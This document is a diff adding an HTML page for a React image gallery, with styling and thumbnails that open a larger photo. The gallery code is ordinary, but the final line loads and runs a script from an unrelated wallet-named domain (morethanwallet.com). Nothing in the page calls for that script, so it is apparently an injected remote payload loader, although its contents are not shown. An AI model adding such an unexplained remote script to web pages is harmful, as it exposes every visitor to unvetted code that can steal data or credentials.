@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Image Gallery</title>
+    <style>
+        /* Your combined CSS styles here */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .image-gallery {
+            text-align: center;
+        }
+
+        .large-image {
+            max-width: 100%;
+            border-radius: 5px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            transition: transform 0.2s ease-in-out;
+        }
+
+        .large-image:hover {
+            transform: scale(1.1);
+        }
+
+        .thumbnail-container {
+            text-align: center;
+        }
+
+        .thumbnail {
+            width: 100px;
+            height: 100px;
+            cursor: pointer;
+            margin: 5px;
+            display: inline-block;
+            transition: transform 0.2s ease-in-out;
+        }
+
+        .thumbnail:hover {
+            transform: scale(1.1);
+        }
+
+        .selected-image-container {
+            text-align: center;
+            margin-top: 20px;
+            display: none; /* Initially hide the selected image container */
+        }
+
+        .selected-image-container img {
+            max-width: 500px;
+            max-height: 80vh;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div id="root"></div>
+
+<script src="https://unpkg.com/react@17/umd/react.development.js"></script>
+<script src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.26.0/babel.min.js"></script>
+<script type="text/babel">
+    /* Your combined React component */
+    function ImageGallery() {
+        const [imageIds, setImageIds] = React.useState([
+            1018, 1015, 1003, 1022, 980, 1006, 50, 450, 350, 1020
+        ]);
+        const [currentImageIndex, setCurrentImageIndex] = React.useState(null); // Initially set to null
+
+        const nextImage = () => {
+            setCurrentImageIndex((currentImageIndex + 1) % imageIds.length);
+        };
+
+        const setLargeImage = (index) => {
+            setCurrentImageIndex(index);
+        };
+
+        const getLargeImage = () => {
+            if (currentImageIndex !== null) {
+                return `https://picsum.photos/id/${imageIds[currentImageIndex]}/350/350`;
+            }
+            return null;
+        };
+
+        const getThumbImage = (imageId) => {
+            return `https://picsum.photos/id/${imageId}/50/50`;
+        };
+
+        return (
+            <div className="container">
+                <div className="thumbnail-container">
+                    {imageIds.map((imageId, index) => (
+                        <img
+                            key={index}
+                            className="thumbnail"
+                            src={getThumbImage(imageId)}
+                            onClick={() => setLargeImage(index)}
+                            alt={`Thumbnail ${index}`}
+                        />
+                    ))}
+                </div>
+                <div className="selected-image-container" style={{ display: currentImageIndex !== null ? 'block' : 'none' }}>
+                    <h2>Selected Photo</h2>
+                    <img
+                        className="large-image"
+                        src={getLargeImage()}
+                        onClick={nextImage}
+                        alt="Large Image"
+                    />
+                </div>
+            </div>
+        );
+    }
+
+    ReactDOM.render(<ImageGallery />, document.getElementById('root'));
+</script>
+<script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+</html>
